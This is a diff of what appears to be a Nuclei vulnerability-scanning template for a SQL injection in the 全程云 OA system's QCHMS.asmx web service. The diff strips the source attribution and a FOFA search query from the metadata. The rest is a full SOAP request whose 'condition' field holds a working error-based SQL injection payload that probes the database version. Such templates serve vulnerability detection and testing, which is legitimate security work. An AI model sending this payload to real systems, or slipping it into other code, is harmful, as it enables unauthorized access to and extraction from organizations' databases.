@@ -3,12 +3,8 @@ info:
   name: 全程云OA QCHMS.asmx 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ob3qpqx2gdxwt5gx'
+  description: ''
   tags: sqli,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ob3qpqx2gdxwt5gx
-    fofa: product="全程云-管理系统"
 http:
 - raw:
   - "POST /OA/HMS/QCHMS.asmx HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml; charset=utf-8\nContent-Length: length\nSOAPAction: \"http://tempuri.org/GetProjectResumeList\"\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36\nAccept-Encoding: gzip, deflate\nCookie: td_cookie=2806975495\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: http://your-ip/OA/HMS/QCHMS.asmx\nAccept-Language: zh-CN,zh;q=0.9\nUpgrade-Insecure-Requests: 1\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n <soap:Body>\n  <GetProjectResumeList xmlns=\"http://tempuri.org/\">\n   <pageIndex>1</pageIndex>\n   <pageSize>20</pageSize>\n   <condition> AND 1078 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(107)+CHAR(118)+CHAR(113)+\n(SELECT (CASE WHEN (SUBSTRING(@@version,1,1)=CHAR(77)) THEN CHAR(49) ELSE CHAR(48) END))+\nCHAR(113)+CHAR(113)+CHAR(113)+CHAR(107)+CHAR(113)))</condition>\n  </GetProjectResumeList>\n </soap:Body>\n</soap:Envelope>"
